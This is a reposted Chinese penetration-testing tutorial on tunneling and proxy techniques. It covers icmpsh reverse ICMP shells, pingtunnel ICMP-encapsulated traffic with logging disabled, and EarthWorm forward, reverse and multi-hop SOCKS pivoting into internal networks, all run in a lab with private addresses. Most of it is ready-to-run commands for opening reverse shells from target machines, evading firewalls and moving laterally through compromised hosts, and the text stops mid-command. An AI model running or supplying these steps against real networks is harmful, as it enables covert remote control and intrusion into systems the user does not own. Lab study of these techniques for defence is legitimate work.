---
title: 隧道代理攻防技术战争手册
url: https://mp.weixin.qq.com/s/EGqB4DP6ENGnEetDWXCCPQ
source: Doonsec's feed
date: 2026-02-07
fetch_date: 2026-02-08T04:30:42.780035
---

# 隧道代理攻防技术战争手册

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MSDUaqtwboSBv7fp0fdcrpzv6iaibCEueZQ1FpgYicy1n34qk8g4OkWoIS2IguwEx36Lzibj0R997buN6W6SMmibWPDib3ia9IOzxdMscRB016iadGU/0?wx_fmt=jpeg)

# 隧道代理攻防技术战争手册

Locks\_
Locks\_

陌笙不太懂安全

![]()

在小说阅读器中沉浸阅读

免责声明

```
由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号陌笙不太懂安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```

```
作者：Locks_原文链接：https://forum.butian.net/share/4397
```

### 前言

本文将深入解析各类隧道代理技术（如ICMP、HTTP等）的实现原理与实战应用，通过具体工具手法（如Ping、cURL、nslookup、Telnet等）演示如何伪装和转发流量，并详细介绍多级隧道代理的搭建方法与技巧，帮助读者掌握隐蔽通信、绕过防火墙限制的核心能力，提升网络渗透与安全防护的实战水平。

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTqWcmPnS2S82V3SYTc7YqpB34UgcKCDsS4micGFlD7lIdgraevibeFI2SbhPKcnm22GTMdFnYYHRXGPemVOm3iaWQ50LNibIpj03w/640?wx_fmt=png&from=appmsg)

### icmpsh

icmpsh是⼀个简单的反向ICMP shell⼯具。与其他类似的开源⼯具相⽐，主要优势在于它不需要管理权限即可在⽬标机器上运⾏。
客户端只能在Windows机器运⾏，服务端可以在任何平台上运⾏。

下载
https://github.com/bdamele/icmpsh

使⽤
kali 192.168.200.129
win8 靶机 192.168.99.135

#### 服务端：

```
git clone https://github.com/inquisb/icmpsh.git

#关闭icmp回复,如果要开启icmp回复，该值设置为0
#_因为icmpsh工具要代替系统本身的icmp应答程序，所以需要提前关闭本地系统的icmp应答，否则Shell的运行会不稳定_
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#运⾏，第⼀个IP是VPS的eth0⽹卡IP，第⼆个IP是⽬标机器出⼝的公⽹IP
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py

#安装impacket
python2 -m pip install impacket
#这里可能报错 使用本地安装
https://github.com/fortra/impacket/releases/tag/impacket_0_11_0
python2 setup.py install

python2 icmpsh_m.py 192.168.99.129192.168.99.135
```

#### 客户端：

```
-t 主机ip地址以发送ping请求。这个选项是强制性的！
-r 发送⼀个包含字符串“Test1234”的测试icmp请求，然后退出。
-d 毫秒请求之间的延迟（毫秒）
-o 毫秒响应超时（毫秒）。如果没有及时收到回复，从机将增加空⽩计数器。如果该计数器达到某个极限，从机将退出。
如果收到响应，计数器将设置回0。
-b 空⽩数量限制（退出前未答复的icmp请求）
-s 字节最⼤数据缓冲区⼤⼩（字节）

icmpsh.exe -t 192.168.99.129 -d 500 -b 30 -s 128
```

![image.png](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboS0mvoSWzxSoxicBRrfNibYKL08jEN2Dcz7TYibszK2Ln4GquSCkiabnDuflzdWjXbmLDtrU2NCyXibaYicyFvJyVabiaYCRQlIwbMibuE/640?wx_fmt=png&from=appmsg)

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQuicZT8nmswVphUrS4mDT9SVvib4B6TOnRcVXC5AEeBiaFscsO36gft2tlSesDO7W0oWtXvqB8rgyWMrqUic740eC3IC7MBL2J8Wo/640?wx_fmt=png&from=appmsg)

### pingtunnel

Pingtunnel 是⼀种通过 ICMP 发送 TCP/UDP 流量的⼯具。其是最流⾏的⼀款ICMP代理⼯具，提供对tcp/udp/sock5流量伪装成icmp流量进⾏转发的功能。需要root或者administrator/system权限。

下载
https://github.com/esrrhs/pingtunnel

#### ⾼权限条件下

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSmIWv1xvnvepOk2G3WAtuhQBoPjLczzEh5FA6qQbWUTSHpIvKmvibO1OicdUn5TzdSu9LfnUDdms2W862rynoz65E5ib67GGdqIs/640?wx_fmt=png&from=appmsg)

##### 构建反向代理

###### 1）服务端

```
-type server 代表开启ICMP SERVER端，等待客户端进⾏连接与通信。
-noprint 1 不在控制台打印⽇志
-nolog 1 不存储⽇志⽂件

echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all

./pingtunnel -type server -noprint 1 -nolog 1
```

设置 socks5

```
pingtunnel.exe -type client -l :4455 -s 192.168.99.129 -sock5 1 -noprint 1 -nolog 1
```

### **EarthWorm**

EW 是⼀套便携式的⽹络穿透⼯具，具有 SOCKS v5服务架设和端⼝转发两⼤核⼼功能，可在复杂⽹络环境下完成⽹络穿透。

能够以“正向”、“反向”、“多级级联”等⽅式打通⼀条⽹络隧道，直达⽹络深处。

![image.png](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRL8wL3uwQLRUy2ecNhIFKaBj6CxQT1I2YfzUSkkFId8nIdJGU6VCz941WkIbiauLTvpHKnkqd0Zm9wLicMN9XPxicYdkOOjchwDM/640?wx_fmt=png&from=appmsg)

* 下载
  https://github.com/idlefire/ew
* 使用

  ```
  EW共有6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）
  ssocksd:正向代理、rcsocks:流量转发、rssocks:socks5反弹
  lcx_slave:端口绑定、lcx_listen:流量转发、lcx_tran:端口转发
  lcx_slave 该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。
  lcx_tran 该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。
  lcx_listen该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。
  通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。
  -l 为服务启动打开一个端口。
  -d 设置反弹主机地址。
  -e 设置反弹端口。
  -f 设置连接主机地址。
  -ｇ连接端口设置连接端口。
  -t 设置超时的毫秒数。默认值值是1000
  ```

|  |  |
| --- | --- |
| **功能名称** | **对应模块** |
| 正向代理 | ssocksd |
| 反向代理 | rcsocks、rssocks |
| 端口转发 | lcx\_listen、lcx\_tran、lcx\_slave |

1. EarthWorm命令详解 ```php
   rcsocks //反向socks代理客户端
   ssocksd //正向代理、监听在本地，直接把当前环境socks代理出去
   rssocks //反向代理、创建反向socks代理服务端
   lcx\_slave //该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。
   lcx\_tran //该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。
   lcx\_listen //该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。

   ```
   #### 1、公网出网

   目标网络边界存在公网IP且可任意开监听端口：

   ![image.png](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQPeoBpic49QqZqRH8sm2QRPNHWZxDurS8CMibyJiadJhQarMqxyXIScZdIcj0auzupH15El13S8oZBkWqJDuBXNquo8CfJA3iaYEI/640?wx_fmt=png&from=appmsg)

   ```
   ./ew -s ssocksd -l 8888// 在 192.168.229.139主机上
   通过这个命令开启 8888 端口的 socks 代理
   ```
   ```

   #### 2、都是内网 但是出网

   目标网络边界不存在公网 IP，需要通过反弹方式创建socks代理：

   ```
   ./ew -s rcsocks -l 1080 -e 8888// 在 192.168.229.143的公网主机添加转接隧道，将 1080 收到的代理请求转交给反连 8888 端口的主机
   ./ew -s rssocks -d 192.168.229.143 -e 8888// 将目标网络的可控边界主机反向连接公网主机
   HackTools 可通过访问 192.168.229.143:1080 端口使用 rssocks 主机提供的 socks5 代理服
   ```

   #### **3、二重网络环境**

   ![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboR27Fe5ibbVVlZXv2XYRmdt5sm8NFIM7dNfvTVEU0VGRwtsPzXc2lVibj8PicWWcHicC0fS2XwGxZzl4iaLMeYUicMher0jbib5olnJWw/640?wx_fmt=png&from=appmsg)
   A kali 192.168.99.129
   B 跳板机 192.168.99.140 10.10.10.20
   C 内网 10.10.10.10

   获得目标网络内两台主机 B、C 的权限，情况描述如下：
   B 主机：存在公网 IP，且自由监听任意端口，无法访问特定资源
   C 主机：目标网络内部主机，可访问特定资源，但无法访问公网
   B 主机可直连 C 主机

   ##### 1）正向代理

   假设拿下B服务器，将工具上传到B服务器上使用
   跳板机执行命令

   ```
   ew_for_Win.exe -s ssocksd -l 8888
   ```

   ![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRibl9PxDiaZOyLjWeUicDMZ6pcP7A19cwxSicDecU5WftYR2xO4FqNYXK7tPTibDuRoSiaB7bdYfvZJXfLInoVXWzJnxjBoo4ZUlMF4/640?wx_fmt=png&from=appmsg)
   攻击机开立开启代理

   ```
   vim /etc/proxychains.conf
   //这里填写的IP是跳板机的IP地址和跳板机上设置的端口
   ```

   ![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSQfhgec7ge6QQLibl5iarAuOex3lYMt6CBhvrO8d6SW9cyqP24DZVbN8U8G6Z3TFYYBPfFP4qkpSmwbEuwzkiaTjmuWsVl31n6ew/640?wx_fmt=png&from=appmsg)
   成功访问内网机器的80端口

   ```
   proxychains4 curl http://10.10.10.10/
   ```

   ![image.png](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR8Jv9E38yP7GYkMLDNnGL57Aia9eiakiaA3Lj0QibPxfmMPiaCNfBCJW3odJ6IHcmaBLDBvXLWDFp9hQjGEPWK90ibGBqHumwUiaNV0k/640?wx_fmt=png&from=appmsg)

   ##### 2）反向代理

   ![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSklecqTwcVxdcOrGXqX7iacezhtrLMScibyZfbqxc6skicicNtiblRfK981uhc1HK1C8bxjtlgsRHVhw8EYpZR5nsu8JRvQHaBQALQ/640?wx_fmt=png&from=appmsg)

   A 7766 B 7766 6677 C 6677

   ###### 第一种

   先在B机器上执行命令
   //跳板机监听7766端口并把流量走6677端口

   ```
   ew_for_Win.exe -s rcsocks -l 7766 -e 6677
   ```

   ![image.png](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSq6aic0mJsxWic4gk9MWIribF97evfnWB1cGibGUibldYPYHeoWkAykPRHWXRibgZKaicicb136w5T3gP0bQ9pAmmaMMYeFleRSiayUCLo/640?wx_fmt=png&from=appmsg)

   再在C机器上执行命令
   //内网机器连接10.10.10.20的6677端口

   ```
   ew_for_Win.exe -s rssocks -d 10.10.10.20 -e 6677
   ```

   ![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQ6x7x9CMDlMYxJolLYxWYNKibWrFSJ6Gv6cF2Y6k0Xiaa9WopxCibvJEuZ252DBPCHA4PlnDBgY0LyDYI1U0rn3x1MUfqvzZ1iayQ/640?wx_fmt=png&from=appmsg)

   攻击机开启代理
   //本地机器做代理，流量走跳板机的7766端口，就可以访问到C内网

   ```
   vim /etc/proxychains.conf
   ```

   ![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQXaUuqdiaRJ7Ticicic9b9X7WqgF8fNzCiboibwXKVcnLzngC2IaRdXNibEh31XwwI8S4YUqAHxOv38kibnhNxfKupu82YvOkK6y7MuIo/640?wx_fmt=png&from=appmsg)

   ![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQnDIthMOrU9NfgsBdInAceIQZJ5jm8cdnDgu1ru3iaia22eINn3vdBF2TOJJxGWscEHcCP1Qmv72PvXGFsvicJvZGOD43nTfib3YE/640?wx_fmt=png&from=appmsg)

   ###### 第二种：

   ![image.png](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRNyJkcjYwnXq8Jp08FbRADQfNDyKzDxfwevTCQTCqEyUrpDmiaZ3FZ6P6L9qAic4KMhzN68HkPSfvzvEN9sPe10A2otmI25VjYM/640?wx_fmt=png&from=appmsg)

   ```
   主机B
   ew -s lcx_tran -l 1080 -f 10.10.10.10 -g 8888

   主机C
   ew -s ssocksd -l 8888

   通过proxifier代理工具访问10.10.10.20:1080
   ```

   ##### 内网 可出网

   ![image.png](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQ879whKz2lOicRu0ojlBfBec9TXVrCDuMFsiciaf334TmiapKiacjAY1nl7PhDXfZaXWcrNr2tBnvQiaMk2ibibEQBRgBFLg7EJS6j4B4/640?wx_fmt=png&from=appmsg)
   A主机，无公网 IP，无法访问特定资源，可访问外网。
   B主机是内部主机，可访问特定资源，却无法回连公网。
   A主机可直连B主机。

   ```
   公网主机
   ew -s lcx_listen -e 8888 -l 1080

   A主机
   ew -s lcx_slave...